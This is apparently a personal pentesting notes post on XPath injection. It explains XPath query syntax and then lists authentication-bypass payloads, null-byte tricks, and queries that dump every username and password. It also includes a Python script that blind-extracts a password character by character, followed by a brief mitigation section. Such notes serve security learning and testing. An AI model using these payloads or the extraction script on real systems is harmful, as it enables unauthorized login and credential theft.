---
title: 'Notes | Web | XPATH injection'
author: Stillwolfing
date: 2024-01-30
categories: ['AxelInsa.github.io', '_posts', 'Notes']
tags: ['AxelInsa.github.io', '_posts', 'Notes']
permalink: /Notes/Web/xpath
---

## Introduction

XPath (XML Path Language) injections pose a significant threat to web applications that use XML databases. Similar to SQL injection attacks, XPath injections involve manipulating XPath queries to extract sensitive information from XML databases. In this article, we will delve into the structure of XPath, explore XPath injections, and discuss mitigation strategies to secure applications against such attacks.

## XPath Format

To comprehend XPath injections, it's crucial to understand the XML standard and XPath language. XML (eXtensible Markup Language) is a markup language developed by the World Wide Web Consortium for describing data in the form of XML documents. XPath, an XML Path Language, allows selecting information within an XML document by referencing data such as text, elements, and attributes.

Let's examine a simple XML document to illustrate its structure:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
    <name>pepe</name>
    <password>peponcio</password>
    <account>admin</account>
</user>
<user>
    <name>mark</name>
    <password>m12345</password>
    <account>regular</account>
</user>
<user>
    <name>fino</name>
    <password>fino2</password>
    <account>regular</account>
</user>
</data>
```

In this example, the XML document describes users with elements like name, password, account type.

### Queries type

```text
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```

## Authentication

Exemple of query for authentication:

```text
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
```

payloads to put in both fields to get the first account:

```text
' or '1'='1
" or "1"="1
' or ''='
" or ""="
```

This will give the following query, equivalent to 1=1 and 1=1:

```
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())
```

To select an particular account, select the account using the username and use one of the previous values in the password field.

## Abusing null injection

In some cases, it is possible to bypass the password verification using a null byte.

```
Username: ' or 1]%00
```

It will form the following query:

```
//user[name/text()='' or 1
```

## Double OR in Username or in password

It enables to have a valid query with only one vulnerable field.

Payloads:

### Bypass with first match

```text

(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
```

So you will get this type of query that will match true:
```
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())
```

### Select account

```text
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2º account
```

You will get this type of query:
```
// This will probably connect you as "admin" if the account exists
string(//user[name/text()=''or contains(name,'adm') or'' and password/text()='']/account/text())
```

### Select account (name known)

```
admin' or '
admin' or '1'='2
```

Resulting query:
```
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())

This is equivalent to: name='admin' or (false and password='') <=> name='admin' or false <=> name='admin'

This will connect you as admin (if the account exists) whatever the password is.
```

## String extraction

If the output contains strings and the user can manipulate the values to search. Example: a search bar to search for username.

```text
/user/username[contains(., '+VALUE+')]
```

```text
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```

## Blind Explotation

To find the length of a value:
```
// bool value
' and string-length(password)=5

// You can also use dichotomy to go faster
' and string-length(password)<5
```

To find the value of a character:
```
'and substring(password,<position_of_the_character>,1)='a'

// Test if the first character of the password is 'a'
'and substring(password,1,1)='a'
```

### Example

```
import requests, string 

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30): 
    r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i)) 
    if ("TRUE_COND" in r.text): 
        l = i 
        break 
print("[+] Password length: " + str(l)) 
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i)) 
    for al in alphabet: 
        r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
        if ("TRUE_COND" in r.text): 
            flag += al
            print("[+] Flag: " + flag) 
            break
```

## Tool

[xcat](https://xcat.readthedocs.io/en/latest/)

## Mitigations

Defending against XPath Injection is essentially similar to defending against SQL injection. The
application must sanitize user input. Specifically, the single and double quote characters should be
disallowed. 

